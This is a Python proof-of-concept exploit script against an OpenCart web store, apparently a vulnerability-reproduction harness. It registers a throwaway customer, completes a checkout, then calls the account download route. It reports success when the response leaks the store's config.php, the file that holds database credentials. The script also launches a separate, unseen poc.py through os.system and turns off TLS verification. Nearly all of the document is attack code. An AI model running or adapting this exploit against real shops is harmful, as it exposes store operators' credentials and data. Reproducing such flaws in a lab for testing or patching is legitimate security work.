import requests
import os
os.system('python3 poc.py')
requests.packages.urllib3.disable_warnings()
host = "opencart"

def register():
    burp0_url = "https://"+host+":443//index.php?route=account/register"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/register", 
    "Cache-Control": "max-age=0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", 
    "Content-Type": "multipart/form-data; boundary=---------------------------7e4183162b02e8", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close"}
    burp0_data = "-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"customer_group_id\"\r\n\r\n1\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\nx\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\nx\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"telephone\"\r\n\r\n123213\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\n1234\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"newsletter\"\r\n\r\n0\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"agree\"\r\n\r\n1\r\n-----------------------------7e4183162b02e8--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
  
def logincus():
    
    burp0_url = "https://"+host+":443//index.php?route=account/login"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/login", 
    "Cache-Control": "max-age=0", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
    "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", 
    "Content-Type": "multipart/form-data; boundary=---------------------------7e43a11530a14", 
    "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", 
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close"}
    burp0_data = "-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e43a11530a14--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)
    cus_cookies=r.cookies['OCSESSID']
    #print(cus_cookies)
    return cus_cookies
    


def addcart():
    
    
    burp0_url = "http://"+host+":80/index.php?route=checkout/cart/add"
    burp0_cookies = {"__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb", "OCSESSID": cus_cookies}
    burp0_headers = {"Origin": "http://"+host+"", "Referer": "http://"+host+"/index.php?route=product/category&path=20_27", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Cache-Control": "max-age=0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Pragma": "no-cache", "Connection": "close"}
    burp0_data = {"product_id": "41", "quantity": "1"}
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
   

def checkout():
    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout"
    burp0_cookies = {"OCSESSID": cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/cart", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    
    
    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"firstname": "x", "lastname": "x", "company": '', "address_1": "123", "address_2": '', "city": "123", "postcode": "123", "country_id": "222", "zone_id": "3513"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

 

    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
  


    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)




    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"shipping_address": "existing", "address_id": "1", "firstname": '', "lastname": '', "company": '', "address_1": '', "address_2": '', "city": '', "postcode": "123", "country_id": "222", "zone_id": "3513"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

    
    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)




    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"shipping_method": "flat.flat", "comment": ''}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

    

    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)





    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"payment_method": "cod", "comment": '', "agree": "1"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/confirm"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=extension/payment/cod/confirm"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "http://"+host+":80/index.php?route=checkout/success"
    burp0_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)

def download():
    burp0_url = "https://"+host+":443//index.php?route=account/download/download&download_id=1"
    burp0_cookies = {"OCSESSID":cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/download", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    #print(r.status_code)
    #print(r_check.text)
    return r_check

def check_poc(r_check):
    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check.text):
        print('PoC success!')
        return 0
    else:
        print('PoC failed!')
        return -1


if __name__ == "__main__":

    register()
    cus_cookies=logincus()
    addcart()
    checkout()
    r_check=download()
    result=check_poc(r_check)
    exit(result)
 